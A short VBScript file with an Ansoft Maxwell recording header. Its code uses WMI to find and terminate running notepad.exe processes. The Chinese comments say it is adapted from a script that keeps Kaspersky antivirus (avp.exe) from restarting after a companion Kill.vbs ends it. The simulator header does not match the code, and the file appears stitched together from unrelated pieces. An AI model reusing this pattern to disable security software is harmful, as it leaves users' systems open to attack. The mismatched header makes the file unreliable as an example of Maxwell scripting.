' ----------------------------------------------
' Script Recorded by Ansoft Maxwell Version 16.0.0
' 4:29:08 下午  十二月 20, 2015
' ----------------------------------------------

dim y,x '不要这行也行……    
set y=getobject("winmgmts:\\.\root\cimv2") '和上面解释一样，这也是涉及到微软的WMI技术！  
set x=y.execquery("select * from win32_process where name='notepad.exe'")   
'查询语句，where后判断avp.exe（卡巴）是否存在进程中！  
'这样当卡巴被上面的Kill.vbs结束时就再也启动不起来了。除非，把Dis.vbs结束了先……  
for each i in x   
i.terminate()  '卡巴要启动马上就终止……  
next
